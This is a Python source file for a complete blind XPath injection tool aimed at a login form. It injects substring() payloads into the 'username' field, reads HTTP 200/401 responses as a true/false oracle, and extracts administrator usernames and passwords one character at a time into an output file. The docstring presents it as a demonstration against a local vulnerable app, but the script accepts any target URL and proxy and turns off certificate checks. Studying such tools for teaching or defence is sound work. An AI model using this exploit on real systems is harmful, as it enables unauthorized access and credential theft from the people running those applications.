"""
blind_xpath_exploit.py

Performs blind XPath injection against a vulnerable login endpoint.

This script targets applications that construct XPath queries unsafely using
user-supplied input from the 'username' field. It uses crafted injection payloads
to extract usernames of users with role='admin', one character at a time.

The serverâ€™s HTTP response code (200 for success, 401 for failure) is used as a boolean
oracle to infer the correctness of each guessed character. The attack proceeds by
iterating over admin user indexes and performing character-by-character guessing
using XPath functions like substring().

This tool is designed to demonstrate inference-based exploitation of XML-backed
authentication mechanisms.

Usage:
    python3 blind_xpath_exploit.py --target http://127.0.0.1:5000
"""

import argparse
import string
import requests
import sys
import time



def get_characters():

    visible_charset = string.digits + string.ascii_letters + string.punctuation

    return visible_charset


def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "Performs blind XPath injection against a vulnerable login endpoint.\n"
            "Uses crafted payloads in the 'username' field to infer usernames of users\n"
            "with role='admin' by observing HTTP status codes (200/401) as a boolean oracle."
        )
    )

    parser.add_argument(
        "--target",
        required=True,
        help="Base URL of the target (e.g. http://127.0.0.1:5000)"
    )

    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Optional delay (in seconds) between requests"
    )

    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose output of each request and response"
    )

    parser.add_argument(
        "--output",
        type=str,
        default="discovered_admins.txt",
        help="File to write discovered admin usernames"
    )

    parser.add_argument(
        "--proxy",
        help="Proxy to use for HTTP requests (e.g. http://127.0.0.1:8080)"
    )

    parser.add_argument(
        "--extract",
        choices=["admin","password","both"],
        required=True,
        help="Type of data to extract: admin, password, or both"
    )


    return parser.parse_args()


def search_admin_role(target, delay, proxy=None):
    """
    Only extract `username`s of users where `role='admin'`
    XPath query: username = ' or substring(//user[role='admin'][1]/username/text(), 1, 1) = 'c' or '
    """

    admins = []

    consecutive_fails = 0
    for index in range(1, 10):
        name = find_admin(index, target, delay, proxy)
        if name:
            admins.append(name)
            consecutive_fails = 0
        else:
            consecutive_fails += 1
            if consecutive_fails >= 3:
                break

    return admins    

def search_admin_passwords(target, delay, proxy=None):
    passwords = []
    consecutive_fails = 0

    for index in range(1, 10):
        name = find_password(index, target, delay, proxy)
        if name:
            passwords.append(name)
            consecutive_fails = 0
        else:
            consecutive_fails += 1
            if consecutive_fails >= 3:
                break

    return passwords    

def search_password_as_admin(admins, target, delay, proxy=None):
    passwords = []
    for index, username in enumerate(admins, start=1):
        password = find_password(index, target, delay, proxy)
        if password:
            passwords.append(f"{username} : {password}")
    return passwords


def find_admin(index, target, delay, proxy=None):

    char_set = get_characters()

    username = ''
    i = 1
    while True:
        found_character = False

        for char in char_set:
            xpath_query = build_payload(index, i, char,"username")
            status = test_char(xpath_query, target, proxy)
            if delay:
                time.sleep(delay)
            if status == 200:  
                username += char
                print_progress("[+] Matched: ", username)
                i += 1
                found_character = True
                break
            else:
                continue

        if not found_character:
            if username:
                print_final("[+] Final admin username", username)
                return username
            else:
                print(f"[-] No match at index {index}")
                break

    return None

def find_password(index, target, delay, proxy=None):

    char_set = get_characters()

    password = ''
    i = 1
    while True:
        found_character = False

        for char in char_set:
            xpath_query = build_payload(index, i, char,"password")
            if delay:
                time.sleep(delay)
            status = test_char(xpath_query, target, proxy)
            if status == 200:  
                password += char
                print_progress("[+] Matched: ", password)
                i += 1
                found_character = True
                break
            else:
                continue

        if not found_character:
            if password:
                print_final("Final admin password", password)
                return password
            else:
                print(f"[-] No match at index {index}")
                break

    return None


def build_payload(index, pos, char, field="username"):
    return f"' or substring(//user[role='admin'][{index}]/{field}/text(), {pos}, 1) = '{char}' or '"


def test_char(query_string, target, proxy=None):

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = f"username={query_string}&password=x"
    proxies = None
    if proxy:
        proxies = {
            'http' : proxy,
            'https' : proxy
        }
    response = requests.post(target, data=data, headers=headers, proxies=proxies,  verify=False)
    return response.status_code


def print_progress(prefix, value):
    sys.stdout.write(f"\r\033[K{prefix}{value}")
    sys.stdout.flush()

def print_final(label, value):
    sys.stdout.write(f"\r\033[K[+] {label}: {value}\n")


def main():
    args = parse_args()

    if args.extract == "admin":
        data = search_admin_role(args.target, args.delay, args.proxy)
    elif args.extract == "password":
        data = search_admin_passwords(args.target, args.delay, args.proxy)
    elif args.extract == "both":
        admins = search_admin_role(args.target, args.delay, args.proxy)
        data = search_password_as_admin(admins,args.target, args.delay, args.proxy)


    if args.output:
        with open(args.output, 'w') as f:
            for line in data:
                f.write(f"{line}\n")


if __name__ == "__main__":
    main()
